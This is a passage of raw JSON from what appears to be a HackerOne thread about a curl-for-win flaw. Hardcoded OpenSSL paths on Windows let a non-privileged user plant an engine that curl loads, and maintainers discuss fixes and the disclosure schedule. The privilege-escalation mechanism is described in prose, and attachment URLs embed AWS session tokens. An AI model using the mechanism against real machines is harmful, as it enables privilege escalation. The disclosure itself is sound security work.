95a73bdb21b7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5064732,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@mirchr gotcha, I misunderstood the documentation. Thanks for clarifying, I'll go make more coffee now as it clearly seems to be needed.","markdown_message":"\u003cp\u003e\u003ca href=\"/mirchr\"\u003e@mirchr\u003c/a\u003e gotcha, I misunderstood the documentation. Thanks for clarifying, I\u0026#39;ll go make more coffee now as it clearly seems to be needed.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-12T11:16:47.651Z","updated_at":"2019-06-12T11:16:47.651Z","actor":{"username":"dgustafsson","cleared":false,"url":"/dgustafsson","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5065195,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@mirchr: Thanks for your report! Author of curl-for-win build process here.\n\nAn interesting issue indeed. In fact the mere presence of such hardcoded directory/ies makes no sense on Windows in general, as there is no standard (or even quasi-standard) location for an equivalent of *nix /usr/local/ssl (or similars) on this platform. \n\nWhat I can see in the build script [./_openssl.sh](https://github.com/curl/curl-for-win/blob/13726f65b060c6f960adf5a68a7a05c129e7ad7d/openssl.sh#L66-L77) of curl-for-win, is that it passes `--prefix=/usr/local` to OpenSSL's `./Configure`, which in turn uses this prefix to configure these hardcoded paths. According to [`Configure`](https://github.com/openssl/openssl/blob/a345ce6cb174bfb7c122a942874ae79af294b92e/Configure#L34-L37), `/usr/local` also happens to be the default value, which, if true, may mean that the issue also applies to OpenSSL as well. (According to faded memories, default `--prefix` value could be changing depending on the folder it was built in.)\n\nHere's the full list of hardcoded paths, after a peek into `curl.exe`:\n- `/usr/local/ssl/ct_log_list.cnf`\n- `/usr/local/ssl` (via `OPENSSLDIR`)\n- `/usr/local/lib/engines-1_1` (via `ENGINESDIR`)\n- `/usr/local/ssl/private`\n- `/usr/local/ssl`\n- `/usr/local/ssl/certs`\n- `/usr/local/ssl/cert.pem`\n\nIdeally all of these should be removed or replaced with secure folders in default Windows OpenSSL builds.\n\nWhat we can do in context of curl-for-win is overriding `--prefix` with a secure root folder, one that works on all Windows systems, regardless of OS install settings, version and configuration. Worst case it could be something that's guaranteed to be an invalid path, _if_ it lets OpenSSL continue to function correctly. Sadly, the solution suggested in `NOTES.WIN` is not universal, it will only work if OpenSSL was built this way on the same (or similarly configured) machine that it's run on.\n\nSo the question is what would be that universally secure root folder on Windows?\n","markdown_message":"\u003cp\u003e\u003ca href=\"/mirchr\"\u003e@mirchr\u003c/a\u003e: Thanks for your report! Author of curl-for-win build process here.\u003c/p\u003e\n\n\u003cp\u003eAn interesting issue indeed. In fact the mere presence of such hardcoded directory/ies makes no sense on Windows in general, as there is no standard (or even quasi-standard) location for an equivalent of *nix /usr/local/ssl (or similars) on this platform. \u003c/p\u003e\n\n\u003cp\u003eWhat I can see in the build script \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fcurl%2Fcurl-for-win%2Fblob%2F13726f65b060c6f960adf5a68a7a05c129e7ad7d%2Fopenssl.sh%23L66-L77\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e./_openssl.sh\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e of curl-for-win, is that it passes \u003ccode\u003e--prefix=/usr/local\u003c/code\u003e to OpenSSL\u0026#39;s \u003ccode\u003e./Configure\u003c/code\u003e, which in turn uses this prefix to configure these hardcoded paths. According to \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fopenssl%2Fopenssl%2Fblob%2Fa345ce6cb174bfb7c122a942874ae79af294b92e%2FConfigure%23L34-L37\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e\u003ccode\u003eConfigure\u003c/code\u003e\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, \u003ccode\u003e/usr/local\u003c/code\u003e also happens to be the default value, which, if true, may mean that the issue also applies to OpenSSL as well. (According to faded memories, default \u003ccode\u003e--prefix\u003c/code\u003e value could be changing depending on the folder it was built in.)\u003c/p\u003e\n\n\u003cp\u003eHere\u0026#39;s the full list of hardcoded paths, after a peek into \u003ccode\u003ecurl.exe\u003c/code\u003e:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003e/usr/local/ssl/ct_log_list.cnf\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\n\u003ccode\u003e/usr/local/ssl\u003c/code\u003e (via \u003ccode\u003eOPENSSLDIR\u003c/code\u003e)\u003c/li\u003e\n\u003cli\u003e\n\u003ccode\u003e/usr/local/lib/engines-1_1\u003c/code\u003e (via \u003ccode\u003eENGINESDIR\u003c/code\u003e)\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e/usr/local/ssl/private\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e/usr/local/ssl\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e/usr/local/ssl/certs\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e/usr/local/ssl/cert.pem\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eIdeally all of these should be removed or replaced with secure folders in default Windows OpenSSL builds.\u003c/p\u003e\n\n\u003cp\u003eWhat we can do in context of curl-for-win is overriding \u003ccode\u003e--prefix\u003c/code\u003e with a secure root folder, one that works on all Windows systems, regardless of OS install settings, version and configuration. Worst case it could be something that\u0026#39;s guaranteed to be an invalid path, \u003cu\u003eif\u003c/u\u003e it lets OpenSSL continue to function correctly. Sadly, the solution suggested in \u003ccode\u003eNOTES.WIN\u003c/code\u003e is not universal, it will only work if OpenSSL was built this way on the same (or similarly configured) machine that it\u0026#39;s run on.\u003c/p\u003e\n\n\u003cp\u003eSo the question is what would be that universally secure root folder on Windows?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-12T12:01:31.795Z","updated_at":"2019-06-12T12:08:56.111Z","actor":{"username":"vsz","cleared":false,"url":"/vsz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/643/721/fde2d78348b717d0e9e169e1803f95a73bdb21b7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5065293,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@vsz I agree with you on that. \n\nI think a viable solution would be to use \"c:\\Program Files (x86)\\Common Files\\curl\" for 32-bit and \"c:\\Program Files\\Common Files\\curl\" for 64-bit. This is a protected path that cannot be altered by low privileged users. Even administrators cannot write to this path unless they elevate their privilege with UAC. The default inherited permissions for files and folders under \"c:\\Program Files\" and \"c:\\Program Files (x66)\" is also restrictive so unless an application running with elevated privileges explicitly alters permissions it will be a secure location by default.\n\n\n\n","markdown_message":"\u003cp\u003e\u003ca href=\"/vsz\"\u003e@vsz\u003c/a\u003e I agree with you on that. \u003c/p\u003e\n\n\u003cp\u003eI think a viable solution would be to use \u0026quot;c:\\Program Files (x86)\\Common Files\\curl\u0026quot; for 32-bit and \u0026quot;c:\\Program Files\\Common Files\\curl\u0026quot; for 64-bit. This is a protected path that cannot be altered by low privileged users. Even administrators cannot write to this path unless they elevate their privilege with UAC. The default inherited permissions for files and folders under \u0026quot;c:\\Program Files\u0026quot; and \u0026quot;c:\\Program Files (x66)\u0026quot; is also restrictive so unless an application running with elevated privileges explicitly alters permissions it will be a secure location by default.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-12T12:30:18.745Z","updated_at":"2019-06-12T12:30:18.745Z","actor":{"username":"mirchr","cleared":true,"url":"/mirchr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/d5WVwYt8n5pYhhom1mNPokFG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5067573,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sounds good! (with a but) — Citing [1] and [2] it seems reasonable to assume that the `Program Files` is located in their default folders in the vaste majority of Windows installations. If not, even Microsoft's own processes and its security model may fail.\n\nLong-time Windows OpenSSL distribution \u003chttps://slproweb.com/products/Win32OpenSSL.html\u003e, does also use the default `Program Files` directories. This also confirms that spaces in the pathname are handled fine. I'd stick to the root folder used by this distro, namely:\n- `C:\\Program Files\\Common Files\\SSL` (64-bit)\n- `C:\\Program Files (x86)\\Common Files\\SSL` (32-bit)\n\n(i.e. `SSL` instead of `curl`.)\n\nThis still leaves one hole in the system: 32-bit Windows editions (Windows 7 and earlier affected), where `curl.exe` will be 32-bit, so the hardcoded folder would be `C:\\Program Files (x86)\\Common Files\\SSL`, but `Program Files` is `C:\\Program Files\\` on these systems. Any idea, how to deal with that?\n\n[1] https://support.microsoft.com/help/933700/microsoft-does-not-support-changing-the-location-of-the-program-files\n[2] https://www.thewindowsclub.com/change-default-program-files-directory-windows\n","markdown_message":"\u003cp\u003eSounds good! (with a but) — Citing [1] and [2] it seems reasonable to assume that the \u003ccode\u003eProgram Files\u003c/code\u003e is located in their default folders in the vaste majority of Windows installations. If not, even Microsoft\u0026#39;s own processes and its security model may fail.\u003c/p\u003e\n\n\u003cp\u003eLong-time Windows OpenSSL distribution \u003ca title=\"https://slproweb.com/products/Win32OpenSSL.html\" href=\"/redirect?url=https%3A%2F%2Fslproweb.com%2Fproducts%2FWin32OpenSSL.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://slproweb.com/products/Win32OpenSSL.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, does also use the default \u003ccode\u003eProgram Files\u003c/code\u003e directories. This also confirms that spaces in the pathname are handled fine. I\u0026#39;d stick to the root folder used by this distro, namely:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\n\u003ccode\u003eC:\\Program Files\\Common Files\\SSL\u003c/code\u003e (64-bit)\u003c/li\u003e\n\u003cli\u003e\n\u003ccode\u003eC:\\Program Files (x86)\\Common Files\\SSL\u003c/code\u003e (32-bit)\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003e(i.e. \u003ccode\u003eSSL\u003c/code\u003e instead of \u003ccode\u003ecurl\u003c/code\u003e.)\u003c/p\u003e\n\n\u003cp\u003eThis still leaves one hole in the system: 32-bit Windows editions (Windows 7 and earlier affected), where \u003ccode\u003ecurl.exe\u003c/code\u003e will be 32-bit, so the hardcoded folder would be \u003ccode\u003eC:\\Program Files (x86)\\Common Files\\SSL\u003c/code\u003e, but \u003ccode\u003eProgram Files\u003c/code\u003e is \u003ccode\u003eC:\\Program Files\\\u003c/code\u003e on these systems. Any idea, how to deal with that?\u003c/p\u003e\n\n\u003cp\u003e[1] \u003ca title=\"https://support.microsoft.com/help/933700/microsoft-does-not-support-changing-the-location-of-the-program-files\" href=\"/redirect?url=https%3A%2F%2Fsupport.microsoft.com%2Fhelp%2F933700%2Fmicrosoft-does-not-support-changing-the-location-of-the-program-files\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://support.microsoft.com/help/933700/microsoft-does-not-support-changing-the-location-of-the-program-files\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\n[2] \u003ca title=\"https://www.thewindowsclub.com/change-default-program-files-directory-windows\" href=\"/redirect?url=https%3A%2F%2Fwww.thewindowsclub.com%2Fchange-default-program-files-directory-windows\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.thewindowsclub.com/change-default-program-files-directory-windows\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-12T13:39:06.300Z","updated_at":"2019-06-12T13:39:44.969Z","actor":{"username":"vsz","cleared":false,"url":"/vsz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/643/721/fde2d78348b717d0e9e169e1803f95a73bdb21b7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5067577,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Is there actually any point/use to allow openssl to dynamically load this config at all when the curl tool is used on Windows? I mean, do we know of any proper use?\n\nWe have a configure switch callled `--disable-ssl-auto-load-config` that disables it...","markdown_message":"\u003cp\u003eIs there actually any point/use to allow openssl to dynamically load this config at all when the curl tool is used on Windows? I mean, do we know of any proper use?\u003c/p\u003e\n\n\u003cp\u003eWe have a configure switch callled \u003ccode\u003e--disable-ssl-auto-load-config\u003c/code\u003e that disables it...\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-12T13:39:15.302Z","updated_at":"2019-06-12T13:39:15.302Z","actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5067646,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I'd tend to think that not too many would miss the dynamic loading feature on Windows — especially for a self-contained, relocatable, command-line tool. It may even fix issues for some, when these configs get loaded while being unaware of it.\n\nWe can even do both. I must fix the OpenSSL binaries either way, but with the `-DCURL_DISABLE_OPENSSL_AUTO_LOAD_CONFIG` curl option, we can cover the case of running 32-bit `curl.exe` on 32-bit Windows editions. As for it remaining as issue for 32-bit `openssl.exe` on 32-bit Windows, it's an issue unrelated to curl.\n\n(Another option is to disable auto load for 32-bit curl builds only, but the result would be somewhat confusing from the user side.)\n","markdown_message":"\u003cp\u003eI\u0026#39;d tend to think that not too many would miss the dynamic loading feature on Windows — especially for a self-contained, relocatable, command-line tool. It may even fix issues for some, when these configs get loaded while being unaware of it.\u003c/p\u003e\n\n\u003cp\u003eWe can even do both. I must fix the OpenSSL binaries either way, but with the \u003ccode\u003e-DCURL_DISABLE_OPENSSL_AUTO_LOAD_CONFIG\u003c/code\u003e curl option, we can cover the case of running 32-bit \u003ccode\u003ecurl.exe\u003c/code\u003e on 32-bit Windows editions. As for it remaining as issue for 32-bit \u003ccode\u003eopenssl.exe\u003c/code\u003e on 32-bit Windows, it\u0026#39;s an issue unrelated to curl.\u003c/p\u003e\n\n\u003cp\u003e(Another option is to disable auto load for 32-bit curl builds only, but the result would be somewhat confusing from the user side.)\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-12T13:49:58.431Z","updated_at":"2019-06-12T13:49:58.431Z","actor":{"username":"vsz","cleared":false,"url":"/vsz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/643/721/fde2d78348b717d0e9e169e1803f95a73bdb21b7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5069456,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sigh, I just discovered that I've already [attempted to disable](https://github.com/curl/curl-for-win/commit/fb80105b91a5dbbc390c9e6c2dcbc9a7e43601d2) auto load on 2018-07-25, but have read the name of the option from the [PR](https://github.com/curl/curl/pull/2791)'s main message, which is `CURL_DISABLE_SSL_AUTO_LOAD_CONFIG`, while inside the source it was or it subsequently became `CURL_DISABLE_OPENSSL_AUTO_LOAD_CONFIG` :(\n\n(The typo survived to the final commit message as well: https://github.com/curl/curl/commit/6684653b682bae0be75ea62bb473b126923952f1)","markdown_message":"\u003cp\u003eSigh, I just discovered that I\u0026#39;ve already \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fcurl%2Fcurl-for-win%2Fcommit%2Ffb80105b91a5dbbc390c9e6c2dcbc9a7e43601d2\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eattempted to disable\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e auto load on 2018-07-25, but have read the name of the option from the \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fcurl%2Fcurl%2Fpull%2F2791\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ePR\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u0026#39;s main message, which is \u003ccode\u003eCURL_DISABLE_SSL_AUTO_LOAD_CONFIG\u003c/code\u003e, while inside the source it was or it subsequently became \u003ccode\u003eCURL_DISABLE_OPENSSL_AUTO_LOAD_CONFIG\u003c/code\u003e :(\u003c/p\u003e\n\n\u003cp\u003e(The typo survived to the final commit message as well: \u003ca title=\"https://github.com/curl/curl/commit/6684653b682bae0be75ea62bb473b126923952f1\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fcurl%2Fcurl%2Fcommit%2F6684653b682bae0be75ea62bb473b126923952f1\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/curl/curl/commit/6684653b682bae0be75ea62bb473b126923952f1\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e)\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-12T14:24:08.355Z","updated_at":"2019-06-12T14:29:24.638Z","actor":{"username":"vsz","cleared":false,"url":"/vsz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/643/721/fde2d78348b717d0e9e169e1803f95a73bdb21b7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5069771,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Ugh. Yeah I spotted the unfortunate discrepancy now too when I had to hunt down the option name...","markdown_message":"\u003cp\u003eUgh. Yeah I spotted the unfortunate discrepancy now too when I had to hunt down the option name...\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-12T14:37:00.043Z","updated_at":"2019-06-12T14:37:00.043Z","actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5070548,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"# Summary\n\nA non-privileged user/program that can put code and a config file in a known path will make curl automatically run that code (as an openssl \"engine\"), and if that curl is invoked by a privileged user it can do anything it wants.\n\nThis flaw exists in the official curl-for-windows binaries built and hosted by the curl project (all versions up to and including 7.65.1_1). It does not exist in the curl executable shipped by Microsoft, bundled with Windows 10.\n\n# Severity?\n\n(Questions for everyone who can read this.)\n\nHow serious is this flaw? (It is currently graded **high**)\n\nHow common is it for Windows machines to run multi-user?\n\nFor multi-user windows installations, do they typically allow \"plain\" users create directories and contents necessary for this flaw?\n\n# Disclosure schedule\n\nWe can fix this flaw and announce it entirely outside of the ordinary release schedule since no source code change is necessary, \"only\" a build fix. I would still like us to not hurry too much so that we risk missing something important but give ourselves at least a few weeks to prepare. (Also, I personally will be traveling June 28 - July 13 during which my activity level in curl land will be reduced drastically.)\n\nAt the furthest end, I think we should announce this no later than July 17 which is the planned release date for curl 7.65.2.\n\nI'll request a CVE for this flaw once we feel we understand this issue properly and have an idea of severity and perhaps the basic advisory.\n\n# Security Advisory\n\nI'll get a first draft done and posted here for review within a couple of days.","markdown_message":"\u003ch1 id=\"summary\"\u003eSummary\u003c/h1\u003e\n\n\u003cp\u003eA non-privileged user/program that can put code and a config file in a known path will make curl automatically run that code (as an openssl \u0026quot;engine\u0026quot;), and if that curl is invoked by a privileged user it can do anything it wants.\u003c/p\u003e\n\n\u003cp\u003eThis flaw exists in the official curl-for-windows binaries built and hosted by the curl project (all versions up to and including 7.65.1_1). It does not exist in the curl executable shipped by Microsoft, bundled with Windows 10.\u003c/p\u003e\n\n\u003ch1 id=\"severity\"\u003eSeverity?\u003c/h1\u003e\n\n\u003cp\u003e(Questions for everyone who can read this.)\u003c/p\u003e\n\n\u003cp\u003eHow serious is this flaw? (It is currently graded \u003cstrong\u003ehigh\u003c/strong\u003e)\u003c/p\u003e\n\n\u003cp\u003eHow common is it for Windows machines to run multi-user?\u003c/p\u003e\n\n\u003cp\u003eFor multi-user windows installations, do they typically allow \u0026quot;plain\u0026quot; users create directories and contents necessary for this flaw?\u003c/p\u003e\n\n\u003ch1 id=\"disclosure-schedule\"\u003eDisclosure schedule\u003c/h1\u003e\n\n\u003cp\u003eWe can fix this flaw and announce it entirely outside of the ordinary release schedule since no source code change is necessary, \u0026quot;only\u0026quot; a build fix. I would still like us to not hurry too much so that we risk missing something important but give ourselves at least a few weeks to prepare. (Also, I personally will be traveling June 28 - July 13 during which my activity level in curl land will be reduced drastically.)\u003c/p\u003e\n\n\u003cp\u003eAt the furthest end, I think we should announce this no later than July 17 which is the planned release date for curl 7.65.2.\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;ll request a CVE for this flaw once we feel we understand this issue properly and have an idea of severity and perhaps the basic advisory.\u003c/p\u003e\n\n\u003ch1 id=\"security-advisory\"\u003eSecurity Advisory\u003c/h1\u003e\n\n\u003cp\u003eI\u0026#39;ll get a first draft done and posted here for review within a couple of days.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-12T15:13:21.884Z","updated_at":"2019-06-12T15:13:21.884Z","actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5070784,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@bagder I can speak to the ability to create folders on c:\\\\. By default on Windows authenticated users are allowed to create folders or append to existing files located in c:\\\\. Here is a screenshot showing the default permissions.\n\n{F507756}","markdown_message":"\u003cp\u003e\u003ca href=\"/bagder\"\u003e@bagder\u003c/a\u003e I can speak to the ability to create folders on c:\\. By default on Windows authenticated users are allowed to create folders or append to existing files located in c:\\. Here is a screenshot showing the default permissions.\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"windows-default-perms-cdrive.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/507/756/6b2f2f70ec13167c53593c6155b068b9e2394be1/windows-default-perms-cdrive.png?response-content-disposition=attachment%3B%20filename%3D%22windows-default-perms-cdrive.png%22%3B%20filename%2A%3DUTF-8%27%27windows-default-perms-cdrive.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQXTSUKMQR%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T063008Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICj7knYENMnZh5A0NglwhkrcefT2BpvxRPeuGap0VUVRAiAmn0d7G6cOHj4E%2FKnqMO8ijTpfdfQo0l3AXDA9%2BVALKyq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM%2FiUJtIxCtzL546wIKpEDje0AX20BGKjUrOSYKWZEdzHWjKRP8eQkcBUNH01qDuCwWFb492oSkH%2FEbtHYsr08fP7HLp%2BTd6LcNHSrDFB9d%2BFYETRUG%2BADKmSGmr3Nwq3xqOP7v1EpWK%2BMEc71vsf2gHyy2w59dToZZzlFf2LAOtvhw7zU2wPf4yKeKdDuOWSWY%2FYHF9%2FAyxR3PD619mcgslnZ5pnYBzX6KdEFvaj1f6s0iYObvLdLHSGri%2BDq6ie%2BP8QhqPHtP8GrAkyOULwf0RxusfkoOYlk6RCSPeGnc%2B%2F0xS4Z3WGTX1xspZfXd0eNVxbwMndOmyXOgV4rAgYhogZMCF8CUdB54myomh4lvN8GC6ZOidewqvFMUYwvJDtcv5pamoBOKfBja9zALg1XyMVI0veiuhxW3yKuxhVLdNKxYadV6pexYwarFA3FPF7h4jC%2F4kY3598KIMbOh7q27L9WfbepKiXnfyh29KSGWxJCVMqZfME%2F5fKTENVzxThmVhSuR%2BN%2FKLX7fsytnAWZSmFjtkQ0xLsf2eZqtVvhJBAwkdSq%2FwU67AHKBp0gQe3TLXIgmEnz83bIH2CwQkZMzah2yfBPWtq0ZmAtH%2B0SUMwvTFocxndYggkQSymMXlnMxSrW%2BShlOraR%2FvJ3Ray4%2FLsf09Cb2XaPSrPR5Wx1KvVAyb2Z18jluSP%2Fm5hPR5XJ4tbNBRxfzhgRI1u4O97hl5qsWT1DT7hNdHJ0BNkn7AUS4VJKTLipMdxmxf4j4xDx5eEMqe7Wr5xoy56daL76ywzY%2F7%2B2Yy7SSE3lpZivXSYx0hn1jJAOzsp%2BLLnwo599EX%2FHSD0E4ZBDvjofSUuw6iva2j9O%2BZyk3WJc%2FbmM7LEVw1QRhA%3D%3D\u0026amp;X-Amz-Signature=d18c495fe33128cf8a35754cc26bb1dfd184726a0a6e33946805a0f3cd915ddb\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/507/756/6b2f2f70ec13167c53593c6155b068b9e2394be1/windows-default-perms-cdrive.png?response-content-disposition=attachment%3B%20filename%3D%22windows-default-perms-cdrive.png%22%3B%20filename%2A%3DUTF-8%27%27windows-default-perms-cdrive.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQXTSUKMQR%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T063008Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICj7knYENMnZh5A0NglwhkrcefT2BpvxRPeuGap0VUVRAiAmn0d7G6cOHj4E%2FKnqMO8ijTpfdfQo0l3AXDA9%2BVALKyq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM%2FiUJtIxCtzL546wIKpEDje0AX20BGKjUrOSYKWZEdzHWjKRP8eQkcBUNH01qDuCwWFb492oSkH%2FEbtHYsr08fP7HLp%2BTd6LcNHSrDFB9d%2BFYETRUG%2BADKmSGmr3Nwq3xqOP7v1EpWK%2BMEc71vsf2gHyy2w59dToZZzlFf2LAOtvhw7zU2wPf4yKeKdDuOWSWY%2FYHF9%2FAyxR3PD619mcgslnZ5pnYBzX6KdEFvaj1f6s0iYObvLdLHSGri%2BDq6ie%2BP8QhqPHtP8GrAkyOULwf0RxusfkoOYlk6RCSPeGnc%2B%2F0xS4Z3WGTX1xspZfXd0eNVxbwMndOmyXOgV4rAgYhogZMCF8CUdB54myomh4lvN8GC6ZOidewqvFMUYwvJDtcv5pamoBOKfBja9zALg1XyMVI0veiuhxW3yKuxhVLdNKxYadV6pexYwarFA3FPF7h4jC%2F4kY3598KIMbOh7q27L9WfbepKiXnfyh29KSGWxJCVMqZfME%2F5fKTENVzxThmVhSuR%2BN%2FKLX7fsytnAWZSmFjtkQ0xLsf2eZqtVvhJBAwkdSq%2FwU67AHKBp0gQe3TLXIgmEnz83bIH2CwQkZMzah2yfBPWtq0ZmAtH%2B0SUMwvTFocxndYggkQSymMXlnMxSrW%2BShlOraR%2FvJ3Ray4%2FLsf09Cb2XaPSrPR5Wx1KvVAyb2Z18jluSP%2Fm5hPR5XJ4tbNBRxfzhgRI1u4O97hl5qsWT1DT7hNdHJ0BNkn7AUS4VJKTLipMdxmxf4j4xDx5eEMqe7Wr5xoy56daL76ywzY%2F7%2B2Yy7SSE3lpZivXSYx0hn1jJAOzsp%2BLLnwo599EX%2FHSD0E4ZBDvjofSUuw6iva2j9O%2BZyk3WJc%2FbmM7LEVw1QRhA%3D%3D\u